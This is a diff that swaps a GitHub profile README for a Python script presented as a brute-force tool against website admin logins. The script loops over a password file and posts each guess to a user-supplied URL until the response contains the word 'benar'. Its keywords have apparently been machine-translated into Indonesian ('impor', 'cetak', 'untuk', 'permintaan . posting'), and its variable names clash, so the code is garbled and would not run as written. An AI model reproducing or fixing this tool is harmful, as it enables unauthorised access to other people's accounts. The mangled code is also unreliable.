@@ -1,16 +1,34 @@
-### Hi there 👋
+#coding oleh Ipan ID
+#CYBER TERSENDIRI
 
-<!--
-**IpanID/IpanID** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+impor  os
+ permintaan impor
 
-Here are some ideas to get you started:
+g  =  ' \ 033 [32; 1m'
+w  =  ' \ 033 [37; 1m'
+y  =  ' \ 033 [33; 1m'
 
-- 🔭 I’m currently working on ...
-- 🌱 I’m currently learning ...
-- 👯 I’m looking to collaborate on ...
-- 🤔 I’m looking for help with ...
-- 💬 Ask me about ...
-- 📫 How to reach me: ...
-- 😄 Pronouns: ...
-- ⚡ Fun fact: ...
--->
+logo  = ( "" "
+\ 033 [33; 1m
+╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ ╔═╗╔╦╗╦ ╔═╗╔═╗
+╠═╣ ║ ║ ╠═╣║ ╠╩╗ ─── ╠═╣ ║║║ ║ ║║ ╦
+╩ ╩ ╩ ╩ ╩ ╩╚═╝╩ ╩ ╩ ╩═╩╝╩═╝╚═╝╚═╝
+          \ 033 [37; 1mBRUTE FORCE A SITUS ADMIN-LOGIN
+"" " )
+cetak ( logo )
+url  =  input ( w  +  "situs web:"  +  g )
+
+pengguna  =  masukan ( w  + "nama pengguna:"  +  g )
+password  =  buka ( 'password.txt' , 'r' )
+
+untuk  o  dalam  kata sandi . garis baca ():
+        pw  =  o . strip ()
+
+        http  =  permintaan . posting ( url , data = { 'user' : user , 'password' : pw , 'submit' : 'submit' })
+        k  =  http . kandungan
+
+        jika  "benar"  di  str ( k ):
+          cetak ( g  +  "berhasil:"  +  y , pw )
+          istirahat
+        lain :
+          cetak ( w  +  "tidak ada:"  +  g , pw )
